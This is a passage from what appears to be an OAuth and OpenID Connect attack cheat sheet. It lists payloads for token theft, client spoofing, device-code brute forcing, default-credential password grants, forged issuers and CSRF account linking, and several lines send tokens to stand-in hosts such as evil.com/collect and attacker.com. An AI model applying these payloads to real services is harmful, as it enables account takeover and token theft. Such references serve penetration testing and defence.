{"sub":"victimID","email":"victim@example.com","admin":true}
```

---

# **8. OAuth Implicit Flow Abuse**

### **Token Exposure in URL Fragment**

```
https://victim.com#access_token=<steal>
```

### **Silent Login Abuse (iframe)**

```
<iframe src="https://auth.com/implicit?client_id=..."></iframe>
```

---

# **9. Unvalidated `client_id` Abuse**

### **Fake Application Impersonation**

```
client_id=attacker-app
```

### **Client Spoofing**

```
client_id=official-client
```

---

# **10. OAuth Device Flow Manipulation**

### **Brute-force user_code**

```
AAAA-AAAA
BBBB-BBBB
```

### **Reuse expired user_code**

```
Submit expired but still accepted user_code
```

---

# **11. Account Takeover VIA Misconfigured Login Linking**

### **Account Linking Hijack**

```
Login to victim’s account using OAuth provider not properly verified.
```

### **Email Mismatch Exploit**

```
Provider returns attacker@example.com but app trusts victim@example.com
```

---

# **12. Misconfigured Token Introspection**

### **Unprotected Introspection Endpoint**

```
POST /introspect
token=<victim-token>
```

### **Attacker supplies fake token**

```
token=FORGEDTOKEN123
```

---

# **13. Refresh Token Abuse**

### **Refresh Token Prediction**

```
refresh_token=11111111111111111111
```

### **Infinite Refresh (no expiry)**

```
Use refresh token indefinitely to keep generating valid access tokens.
```

---

# **14. OAuth Password Grant Abuse (legacy)**

### **Direct Credential Harvesting**

```
POST /token
grant_type=password&username=admin&password=admin
```

### **Password Grant with Missing Client Secret**

```
grant_type=password&client_secret=
```

---

# **15. SSRF via Token Endpoint**

### **Custom Token Endpoint**

```
token_endpoint=https://attacker.com/collect
```

### **Client sends tokens to attacker-controlled URL**

```
POST https://evil.com/oauth/token
```

---

# **16. OpenID Connect Vulnerabilities**

### **Nonce Missing / Weak**

```
nonce=123
```

### **Fake Issuer**

```
"iss": "https://evil.com"
```

### **Ignored aud Claim**

```
aud="attacker-client"
```

---

# **17. OAuth Token Leakage via Logs / Referrers**

### **Using redirect_uri with external resources**

```
redirect_uri=https://trusted.com?img=https://evil.com/collect?token=<token>
```

### **Token in Referer**

Load third-party script that leaks token in URL.

---

# **18. CORS + OAuth Token Theft**

### **Misconfigured CORS**

```
Access-Control-Allow-Origin: *
```

Allows JavaScript to steal:

```
Authorization: Bearer <token>
```

---

# **19. OAuth → CSRF Chaining**

### **Auto-submit form to trigger OAuth login**

```
<form action="https://auth.com/oauth" method="GET">
```

### **Forcing victim login into attacker-controlled account**

```
redirect_uri=https://app.com/callback?linkAccount=attacker
```

---

# **20. Real-World OAuth Vulnerable Patterns**

### **Misconfigured Google OAuth**

```
redirect_uri=https://google.com.evil.com
```

### **Facebook OAuth Misconfiguration**

```
redirect_uri=https://facebook.com/evil?code=<steal>
```

### **Microsoft OIDC Misconfiguration**

```
tenant=common (allows anyone to authenticate)
```

---
